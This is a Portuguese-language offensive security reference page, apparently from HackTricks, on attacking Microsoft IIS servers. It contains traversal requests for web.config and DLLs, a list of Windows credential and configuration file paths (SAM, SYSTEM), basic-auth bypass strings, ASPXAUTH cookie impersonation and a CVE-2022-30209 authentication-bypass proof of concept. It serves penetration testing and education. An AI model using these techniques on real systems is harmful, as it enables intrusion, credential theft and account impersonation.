# IIS - Internet Information Services

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

Testar extens√µes de arquivos execut√°veis:

* asp
* aspx
* config
* php

## Divulga√ß√£o de Endere√ßo IP Interno

Em qualquer servidor IIS onde voc√™ obtenha um 302, voc√™ pode tentar remover o cabe√ßalho Host e usar HTTP/1.0 e dentro da resposta o cabe√ßalho Location pode apontar para o endere√ßo IP interno:

```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```

Resposta revelando o IP interno:

```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```

## Executar arquivos .config

Voc√™ pode fazer upload de arquivos .config e us√°-los para executar c√≥digo. Uma maneira de fazer isso √© anexar o c√≥digo ao final do arquivo dentro de um coment√°rio HTML: [Baixe o exemplo aqui](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Mais informa√ß√µes e t√©cnicas para explorar essa vulnerabilidade [aqui](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## Bruteforce de Descoberta IIS

Baixe a lista que criei:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

Ela foi criada mesclando o conte√∫do das seguintes listas:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Use sem adicionar nenhuma extens√£o, os arquivos que precisam dela j√° a possuem.

## Traversal de Caminho

### Vazamento de c√≥digo fonte

Confira o artigo completo em: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
Em resumo, existem v√°rios arquivos web.config dentro das pastas da aplica√ß√£o com refer√™ncias a arquivos "**assemblyIdentity**" e "**namespaces**". Com essas informa√ß√µes, √© poss√≠vel saber **onde est√£o localizados os execut√°veis** e baix√°-los.\
A partir dos **Dlls baixados**, tamb√©m √© poss√≠vel encontrar **novos namespaces** nos quais voc√™ deve tentar acessar e obter o arquivo web.config para encontrar novos namespaces e assemblyIdentity.\
Al√©m disso, os arquivos **connectionstrings.config** e **global.asax** podem conter informa√ß√µes interessantes.\\
{% endhint %}

Nas aplica√ß√µes **.Net MVC**, o arquivo **web.config** desempenha um papel crucial ao especificar cada arquivo bin√°rio nos quais a aplica√ß√£o depende por meio das tags XML **"assemblyIdentity"**.

### **Explorando Arquivos Bin√°rios**

Um exemplo de acesso ao arquivo **web.config** √© mostrado abaixo:

```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```

Este pedido revela v√°rias configura√ß√µes e depend√™ncias, tais como:

* Vers√£o do **EntityFramework**
* **AppSettings** para p√°ginas da web, valida√ß√£o de cliente e JavaScript
* Configura√ß√µes do **System.web** para autentica√ß√£o e tempo de execu√ß√£o
* Configura√ß√µes de m√≥dulos do **System.webServer**
* Associa√ß√µes de montagem do **Runtime** para v√°rias bibliotecas como **Microsoft.Owin**, **Newtonsoft.Json** e **System.Web.Mvc**

Essas configura√ß√µes indicam que certos arquivos, como **/bin/WebGrease.dll**, est√£o localizados dentro da pasta /bin da aplica√ß√£o.

### **Arquivos do Diret√≥rio Raiz**

Arquivos encontrados no diret√≥rio raiz, como **/global.asax** e **/connectionstrings.config** (que cont√©m senhas sens√≠veis), s√£o essenciais para a configura√ß√£o e opera√ß√£o da aplica√ß√£o.

### **Namespaces e Web.Config**

Aplica√ß√µes MVC tamb√©m definem arquivos **web.config** adicionais para namespaces espec√≠ficos a fim de evitar declara√ß√µes repetitivas em cada arquivo, como demonstrado em um pedido para baixar outro **web.config**:

```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```

### **Baixando DLLs**

A men√ß√£o de um namespace personalizado sugere a exist√™ncia de uma DLL chamada "**WebApplication1**" presente no diret√≥rio /bin. Em seguida, √© mostrada uma solicita√ß√£o para baixar o **WebApplication1.dll**:

```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```

Isso sugere a presen√ßa de outros DLLs essenciais, como **System.Web.Mvc.dll** e **System.Web.Optimization.dll**, no diret√≥rio /bin.

Em um cen√°rio onde um DLL importa um namespace chamado **WebApplication1.Areas.Minded**, um atacante pode inferir a exist√™ncia de outros arquivos web.config em caminhos previs√≠veis, como **/nome-da-√°rea/Views/**, contendo configura√ß√µes espec√≠ficas e refer√™ncias a outros DLLs na pasta /bin. Por exemplo, uma solicita√ß√£o para **/Minded/Views/web.config** pode revelar configura√ß√µes e namespaces que indicam a presen√ßa de outro DLL, **WebApplication1.AdditionalFeatures.dll**.

### Arquivos comuns

De [aqui](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```

## Erro 404 HTTPAPI 2.0

Se voc√™ encontrar um erro como o seguinte:

![](https://github.com/carlospolop/hacktricks/blob/pt/.gitbook/assets/image%20\(446\)%20\(1\)%20\(2\)%20\(2\)%20\(3\)%20\(3\)%20\(2\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(13\).png)

Isso significa que o servidor **n√£o recebeu o nome de dom√≠nio correto** no cabe√ßalho Host.\
Para acessar a p√°gina da web, voc√™ pode verificar o **Certificado SSL** fornecido e talvez encontrar o nome do dom√≠nio/subdom√≠nio l√°. Se n√£o estiver l√°, pode ser necess√°rio **for√ßar VHosts** at√© encontrar o correto.

## Vulnerabilidades antigas do IIS que valem a pena procurar

### Vulnerabilidade/Recurso do caractere til ‚Äú\~‚Äù do Microsoft IIS - Divulga√ß√£o de Nome Curto de Arquivo/Pasta

Voc√™ pode tentar **enumerar pastas e arquivos** dentro de cada pasta descoberta (mesmo que exija Autentica√ß√£o B√°sica) usando essa **t√©cnica**.\
A principal limita√ß√£o dessa t√©cnica, se o servidor for vulner√°vel, √© que **s√≥ pode encontrar at√© as primeiras 6 letras do nome de cada arquivo/pasta e as primeiras 3 letras da extens√£o** dos arquivos.

Voc√™ pode usar [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) para testar essa vulnerabilidade:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (183).png>)

Pesquisa original: [https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

Voc√™ tamb√©m pode usar o **metasploit**: `use scanner/http/iis_shortname_scanner`

### Bypass de Autentica√ß√£o B√°sica

**Burlar** uma autentica√ß√£o b√°sica (**IIS 7.5**) tentando acessar: `/admin:$i30:$INDEX_ALLOCATION/admin.php` ou `/admin::$INDEX_ALLOCATION/admin.php`

Voc√™ pode tentar **combinar** essa **vulnerabilidade** com a anterior para encontrar novas **pastas** e **burlar** a autentica√ß√£o.

## Depura√ß√£o habilitada do ASP.NET Trace.AXD

O ASP.NET inclui um modo de depura√ß√£o e seu arquivo √© chamado `trace.axd`.

Ele mant√©m um log muito detalhado de todas as solicita√ß√µes feitas a uma aplica√ß√£o ao longo do tempo.

Essas informa√ß√µes incluem IPs de clientes remotos, IDs de sess√£o, todos os cookies de solicita√ß√£o e resposta, caminhos f√≠sicos, informa√ß√µes de c√≥digo-fonte e potencialmente at√© nomes de usu√°rio e senhas.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## Cookie ASPXAUTH

ASPXAUTH usa as seguintes informa√ß√µes:

* **`validationKey`** (string): chave codificada em hexadecimal para uso na valida√ß√£o da assinatura.
* **`decryptionMethod`** (string): (padr√£o ‚ÄúAES‚Äù).
* **`decryptionIV`** (string): vetor de inicializa√ß√£o codificado em hexadecimal (padr√£o para um vetor de zeros).
* **`decryptionKey`** (string): chave codificada em hexadecimal para uso na descriptografia.

No entanto, algumas pessoas usar√£o os **valores padr√£o** desses par√¢metros e usar√£o como **cookie o e-mail do usu√°rio**. Portanto, se voc√™ encontrar um site usando a **mesma plataforma** que est√° usando o cookie ASPXAUTH e **criar um usu√°rio com o e-mail do usu√°rio que deseja se passar** no servidor sob ataque, voc√™ pode ser capaz de usar o **cookie do segundo servidor no primeiro** e se passar pelo usu√°rio.\
Este ataque funcionou neste [**relato**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).

## Bypass de Autentica√ß√£o do IIS com senhas em cache (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Relat√≥rio completo aqui](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): Um bug no c√≥digo **n√£o verificava corretamente a senha fornecida pelo usu√°rio**, ent√£o um atacante cujo **hash da senha atinge uma chave** que j√° est√° no **cache** poder√° fazer login como esse usu√°rio.

```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
